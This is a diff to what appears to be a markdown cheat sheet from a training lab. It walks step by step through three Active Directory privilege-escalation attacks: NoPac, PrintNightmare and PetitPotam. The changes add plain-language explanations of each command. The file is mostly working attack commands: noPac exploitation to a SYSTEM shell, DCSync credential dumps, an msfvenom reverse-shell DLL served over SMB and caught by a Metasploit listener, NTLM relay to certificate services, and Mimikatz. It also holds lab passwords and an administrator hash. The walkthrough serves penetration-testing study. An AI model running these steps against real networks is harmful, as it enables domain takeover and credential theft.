@@ -29,21 +29,22 @@ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -
 export KRB5CCNAME=dc01.ccache
 secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 ```
+> Quick reference for all three attacks. Run scanner.py first before noPac.py to confirm the environment is vulnerable. For PetitPotam, run ntlmrelayx in one terminal and PetitPotam in another — order matters. Replace IP addresses and domain names for your target.
 
 ---
 
 ## Attack 1 — NoPac (SamAccountName Spoofing)
 
-**CVEs:** `2021-42278` (SAM bypass) + `2021-42287` (Kerberos PAC)  
+**Common Vulnerabilities and Exposures (CVEs):** `2021-42278` (Security Account Manager bypass) + `2021-42287` (Kerberos Privilege Attribute Certificate)  
 **Requirement:** Any standard domain user + ms-DS-MachineAccountQuota ≥ 1 (default = 10)  
 **Result:** SYSTEM shell or DCSync from a standard domain user in one command
 
 **How it works:**
-1. Create a new computer account (any authenticated user can add up to 10 by default)
-2. Rename it to match a Domain Controller's SamAccountName (e.g. `ACADEMY-EA-DC01`)
-3. Request a TGT — KDC issues it thinking we're the DC
-4. Rename computer back, then request a TGS — service issues ticket under DC identity
-5. Use DC ticket to get SYSTEM shell or run DCSync
+1. Create a new computer account. Any authenticated user can add up to 10 by default.
+2. Rename it to match a Domain Controller's SamAccountName (e.g. `ACADEMY-EA-DC01`).
+3. Request a Ticket Granting Ticket (TGT). The Key Distribution Center (KDC) issues it thinking you are the DC.
+4. Rename the computer back, then request a Ticket Granting Service (TGS) ticket. The service issues it under the DC's identity.
+5. Use the DC ticket to get a SYSTEM shell or run DCSync.
 
 ### Step 1 — SSH into the attack host
 
@@ -51,6 +52,7 @@ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA
 ssh htb-student@10.129.94.209
 # password: HTB_@cademy_stdnt!
 ```
+> Connects to the Linux attack host where all three tools are installed. Replace the IP with the address of your attack host.
 - All three attacks in this section are run from the Linux attack host ATTACK01
 - The DC (172.16.5.5) and internal network are only reachable from this host
 
@@ -59,6 +61,7 @@ ssh htb-student@10.129.94.209
 ```bash
 sudo python3 /opt/noPac/scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
 ```
+> Checks whether the DC is vulnerable to NoPac. Uses standard domain user credentials. "Got TGT with PAC" in the output means the attack will work. If `ms-DS-MachineAccountQuota = 0`, the attack is blocked.
 - Uses forend's creds (standard domain user) to attempt to get a TGT from the DC
 - Checks `ms-DS-MachineAccountQuota` — must be ≥ 1 for the attack to work
 - "Got TGT with PAC" = vulnerable. "Ticket size 663" = got DC-level ticket = exploit works
@@ -81,6 +84,7 @@ sudo python3 /opt/noPac/noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
   --impersonate administrator \
   -use-ldap
 ```
+> Exploits NoPac to get a SYSTEM shell on the DC. `-shell` drops into an smbexec shell — use full absolute paths in that shell, `cd` does not work. `--impersonate administrator` spoofs the built-in domain admin. Saves a `.ccache` ticket to disk for reuse.
 - `forend:Klmcargo2` = standard domain user creds — no elevated rights needed
 - `-dc-ip 172.16.5.5` = IP of the Domain Controller to target
 - `-dc-host ACADEMY-EA-DC01` = hostname of the DC — must match the -dc-ip host
@@ -95,6 +99,7 @@ sudo python3 /opt/noPac/noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
 ```cmd
 type C:\Users\Administrator\Desktop\DailyTasks\flag.txt
 ```
+> Reads a file using a full absolute path. The smbexec shell executes each command as a fresh batch file — directory state does not persist between commands. Always use full paths.
 - smbexec shells execute each command by writing a batch file over SMB — no persistent directory state
 - `cd` does not work — always use full absolute paths for every command
 - `type` = Windows equivalent of `cat`
@@ -111,6 +116,7 @@ sudo python3 /opt/noPac/noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
   -dump \
   -just-dc-user INLANEFREIGHT/administrator
 ```
+> Skips the interactive shell and dumps the administrator hash directly. `-dump` runs secretsdump internally. `-just-dc-user` limits output to one account — faster and less noisy than a full dump.
 - `-dump` = run secretsdump instead of opening a shell
 - `-just-dc-user` = only dump hashes for one user — faster and less noisy
 - Outputs administrator NTLM hash + Kerberos keys directly
@@ -132,6 +138,7 @@ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
 # MS-PAR  = Print System Asynchronous Remote Protocol
 # Both present = likely vulnerable
 ```
+> Enumerates Remote Procedure Call (RPC) endpoints on the target and filters for Print Spooler protocols. If either `MS-RPRN` or `MS-PAR` appears, the Print Spooler is running and the host may be vulnerable. Replace the IP for your target.
 - `rpcdump.py` enumerates RPC endpoints exposed on the target
 - MS-RPRN/MS-PAR present = Print Spooler is running and accessible remotely
 
@@ -140,6 +147,7 @@ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
 ```
+> Creates a malicious DLL that connects back to your listener when loaded. Replace `LHOST` with your attack host IP and `LPORT` with any open port. The `-f dll` flag outputs in Windows DLL format.
 - Creates a malicious DLL that calls back to our listener when executed
 - The DC will load this DLL via the Print Spooler service as SYSTEM
 
@@ -148,6 +156,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f
 ```bash
 sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
 ```
+> Hosts a temporary SMB share so the target can pull the DLL. `-smb2support` is required for modern Windows hosts that have SMBv1 disabled. Replace the path with the directory containing your DLL.
 - Creates an SMB share the target DC can reach to pull down the DLL
 - `-smb2support` = required for modern Windows targets (SMBv1 disabled)
 
@@ -161,6 +170,7 @@ set LHOST 172.16.5.225
 set LPORT 8080
 run
 ```
+> Sets up a Metasploit listener to catch the reverse shell. LHOST and LPORT must match what you set in msfvenom. Start this before triggering the exploit so the callback is not missed.
 - Catches the reverse shell callback when the DC loads our DLL
 
 ### Step 5 — Trigger exploit
@@ -168,6 +178,7 @@ run
 ```bash
 sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
 ```
+> Sends the exploit to the DC's Print Spooler service using forend's domain credentials. The DC will load the DLL from the SMB share and execute it as SYSTEM. Your Metasploit listener should receive a callback.
 - Connects to Print Spooler RPC on the DC using forend's creds
 - Forces the DC to load our DLL from the SMB share
 - DLL executes as SYSTEM → reverse shell connects to MSF listener
@@ -176,15 +187,15 @@ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\
 
 ## Attack 3 — PetitPotam (CVE-2021-36942)
 
-**Requirement:** No authentication needed + AD CS with Web Enrollment running  
-**Result:** Coerce DC to authenticate → relay to CA → get DC certificate → TGT → DCSync  
+**Requirement:** No authentication needed + Active Directory Certificate Services (AD CS) with Web Enrollment running  
+**Result:** Coerce DC to authenticate → relay to Certificate Authority (CA) → get DC certificate → TGT → DCSync  
 
 **How it works:**
-1. ntlmrelayx listens for incoming NTLM auth and relays it to the CA's web enrollment page
-2. PetitPotam coerces the DC to authenticate to our host via MS-EFSRPC
-3. ntlmrelayx relays that auth to AD CS → CA issues a certificate for the DC machine account
-4. Use certificate with gettgtpkinit.py to get a TGT for the DC machine account
-5. Use TGT with secretsdump.py to DCSync → full domain compromise
+1. `ntlmrelayx` listens for incoming New Technology LAN Manager (NTLM) auth and relays it to the CA's web enrollment page.
+2. PetitPotam coerces the DC to authenticate to your host using the MS-EFSRPC protocol.
+3. `ntlmrelayx` relays that auth to AD CS. The CA issues a certificate for the DC machine account.
+4. Use the certificate with `gettgtpkinit.py` to request a TGT for the DC machine account.
+5. Use the TGT with `secretsdump.py` to run DCSync and achieve full domain compromise.
 
 ### Step 1 — Start ntlmrelayx (Window 1)
 
@@ -194,6 +205,7 @@ sudo ntlmrelayx.py -debug -smb2support \
   --adcs \
   --template DomainController
 ```
+> Starts an NTLM relay listener that forwards captured authentication to the AD Certificate Services (AD CS) web enrollment page. `--adcs` requests a certificate instead of just capturing credentials. `--template DomainController` issues a cert that allows DC impersonation.
 - `--target` = the CA's web enrollment URL — this is where we relay the DC's credentials
 - `--adcs` = tells ntlmrelayx to request a certificate (not just capture/relay creds)
 - `--template DomainController` = request a cert using the DomainController template (allows DC impersonation)
@@ -206,6 +218,7 @@ python3 PetitPotam.py 172.16.5.225 172.16.5.5
 # 172.16.5.225 = our attack host (ntlmrelayx listener)
 # 172.16.5.5   = DC to coerce
 ```
+> Forces the DC to authenticate to your attack host using MS-EFSRPC. The first IP is where ntlmrelayx is listening. The second IP is the DC to coerce. ntlmrelayx catches the connection and relays it to AD CS.
 - Calls MS-EFSRPC methods on the DC that force it to authenticate back to us
 - Look for: "Attack worked!" — DC sent its NTLM auth to our listener
 - ntlmrelayx catches it and relays to AD CS → outputs a base64 certificate blob
@@ -217,6 +230,7 @@ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ \
   -pfx-base64 <BASE64_BLOB_FROM_NTLMRELAYX> dc01.ccache
 # Save the AS-REP encryption key from output — needed for getnthash.py
 ```
+> Uses the certificate from ntlmrelayx to get a Kerberos TGT for the DC machine account. Paste the base64 blob from ntlmrelayx output. The ticket is saved to `dc01.ccache`. Save the AS-REP key printed in the output.
 - Uses PKINIT (certificate-based Kerberos auth) to get a TGT for the DC machine account
 - The TGT is saved to `dc01.ccache`
 - The AS-REP encryption key in the output is needed if you want to use getnthash.py later
@@ -232,6 +246,7 @@ secretsdump.py -just-dc-user INLANEFREIGHT/administrator \
 # -k = use Kerberos (reads KRB5CCNAME)
 # -no-pass = no password needed, using ticket
 ```
+> Sets the active Kerberos ticket file and uses it to run DCSync. `export KRB5CCNAME` must be set before any `-k -no-pass` command. `-k` tells secretsdump to use Kerberos instead of password authentication.
 - We now have a TGT for the DC machine account, which has replication rights
 - secretsdump uses that TGT to perform DCSync → dumps administrator hash
 
@@ -247,6 +262,7 @@ secretsdump.py -just-dc-user INLANEFREIGHT/administrator \
   "ACADEMY-EA-DC01$"@172.16.5.5 \
   -hashes aad3c435b514a4eeaad3b935b51304fe:<DC_NT_HASH>
 ```
+> Gets the DC machine account's NTLM hash from the certificate TGT, then uses it to run DCSync. Paste the AS-REP key saved from gettgtpkinit.py. The `aad3c435b...` prefix is the blank LM hash — leave it as-is.
 
 ### Confirm admin access
 
@@ -254,6 +270,7 @@ secretsdump.py -just-dc-user INLANEFREIGHT/administrator \
 nxc smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
 # [+] INLANEFREIGHT.LOCAL\administrator (Pwn3d!)
 ```
+> Confirms the dumped administrator hash works by testing SMB auth. "Pwn3d!" means local admin or domain admin access is confirmed on that host.
 
 ### Windows alternative — Rubeus PTT
 
@@ -265,6 +282,7 @@ nxc smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
 .\mimikatz.exe
 lsadump::dcsync /user:inlanefreight\krbtgt
 ```
+> Windows path for PetitPotam. Uses Rubeus to request a TGT from the certificate and inject it into memory with `/ptt`. Then runs Mimikatz DCSync using the injected ticket — no password needed.
 
 ---
 
